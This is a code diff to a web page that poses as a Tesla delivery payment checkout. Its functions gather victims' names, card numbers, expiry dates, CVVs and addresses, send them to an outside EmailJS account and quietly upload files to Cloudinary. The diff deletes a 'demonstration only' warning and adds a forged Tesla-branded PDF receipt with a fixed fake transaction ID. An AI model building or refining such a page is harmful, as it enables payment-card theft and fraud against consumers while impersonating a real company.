@@ -415,7 +415,7 @@
       <p>You will receive a delivery confirmation email within 24 hours.</p>
       <p>Track your vehicle at <a href="#">www.tesla.com/track</a></p>
     </div>
-    <button class="btn" onclick="showCustomAlert('This is a demonstration only. No actual receipt is generated.')">Download Receipt</button>
+    <button class="btn" onclick="downloadReceipt()">Download Receipt</button>
     <div class="security-badge" style="justify-content: center;">
       <svg width="16" height="16" viewBox="0 0 24 24" fill="#5cb85c" style="margin-right: 8px;">
         <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
@@ -429,6 +429,30 @@
   </div>
 </div>
 
+<!-- Hidden Receipt Section for PDF generation -->
+<div id="receipt-section" style="padding: 20px; background: #fff; width: 300px; display: none;">
+  <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla" style="width: 120px; margin-bottom: 10px;">
+  <div style="text-align: center; margin: 15px 0;">
+    <svg viewBox="0 0 24 24" fill="#5cb85c" style="width:40px; height:40px;">
+      <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+    </svg>
+  </div>
+  <h2 style="text-align: center; margin-bottom: 15px;">Delivery Confirmed!</h2>
+  <div class="summary-box" style="margin-bottom: 10px;">
+    <div class="summary-row"><span>Vehicle:</span><span>Model Y Performance</span></div>
+    <div class="summary-row"><span>VIN:</span><span id="vin-display-receipt"></span></div>
+    <div class="summary-row"><span>Delivery Date:</span><span id="delivery-date-receipt"></span></div>
+    <div class="summary-row"><span>Delivery Address:</span><span id="delivery-address-receipt"></span></div>
+    <div class="summary-row total"><span>Amount Paid:</span><span>$2,285.00</span></div>
+  </div>
+  <div style="font-size: 12px; text-align: center; margin-top: 10px;">
+    Transaction ID: TES-78912345-2024
+  </div>
+  <div style="font-size: 11px; text-align: center; margin-top: 10px;">
+    Thank you for your order.
+  </div>
+</div>
+
 <!-- Custom Modal Alert -->
 <div id="custom-alert" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
   <div style="background:#fff; padding:20px; max-width:350px; border-radius:8px; box-shadow:0 4px 8px rgba(0,0,0,0.2); text-align:center;">
@@ -438,7 +462,10 @@
   </div>
 </div>
 
-   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
 <script>
 emailjs.init("1-W3uHSnlpZGDZ1i3");
 
@@ -510,7 +537,6 @@ async function processPayment() {
         throw new Error(`Please complete all required fields`);
       }
     }
-
     const paymentMethod = document.querySelector('.payment-method.active').textContent.trim();
     const templateParams = {
       full_legal_name: document.getElementById('fullname').value,
@@ -523,7 +549,6 @@ async function processPayment() {
       vin_number: vin,
       delivery_address: deliveryAddress
     };
-
     if (paymentMethod === 'Credit/Debit') {
       const cardFields = ['card-number', 'expiry', 'cvv', 'card-name'];
       for (const field of cardFields) {
@@ -545,19 +570,16 @@ async function processPayment() {
       const receiptUrl = await silentUploadToCloudinary(fileInput.files[0]);
       templateParams.receipt_url = receiptUrl;
     }
-
     const emailResponse = await emailjs.send(
       'service_pveujll',
       'template_zqpc6bx',
       templateParams
     );
-
     if (emailResponse.status === 200) {
       showPage('confirmation-page');
     } else {
       throw new Error('Email sending failed');
     }
-
   } catch (error) {
     showCustomAlert(error.message);
     console.error('Payment processing error:', error);
@@ -575,5 +597,25 @@ function showCustomAlert(message) {
 function closeCustomAlert() {
   document.getElementById('custom-alert').style.display = 'none';
 }
+
+function downloadReceipt() {
+  document.getElementById('vin-display-receipt').textContent = document.getElementById('vin-display').textContent;
+  document.getElementById('delivery-date-receipt').textContent = document.getElementById('delivery-date').textContent;
+  document.getElementById('delivery-address-receipt').textContent = document.getElementById('delivery-address').textContent;
+  const receiptElement = document.getElementById('receipt-section');
+  receiptElement.style.display = 'block';
+  html2canvas(receiptElement).then(canvas => {
+    const imgData = canvas.toDataURL('image/png');
+    const { jsPDF } = window.jspdf;
+    const pdf = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
+    const pageWidth = pdf.internal.pageSize.getWidth();
+    const imgProps = pdf.getImageProperties(imgData);
+    const pdfHeight = (imgProps.height * pageWidth) / imgProps.width;
+    pdf.addImage(imgData, 'PNG', 0, 20, pageWidth, pdfHeight);
+    pdf.setFontSize(18);
+    pdf.text("Tesla Delivery Receipt", pageWidth / 2, 15, { align: "center" });
+    pdf.save(`Tesla_Receipt_${new Date().toISOString().slice(0,10)}.pdf`);
+    receiptElement.style.display = 'none';
+  });
+}
 </script>
-    
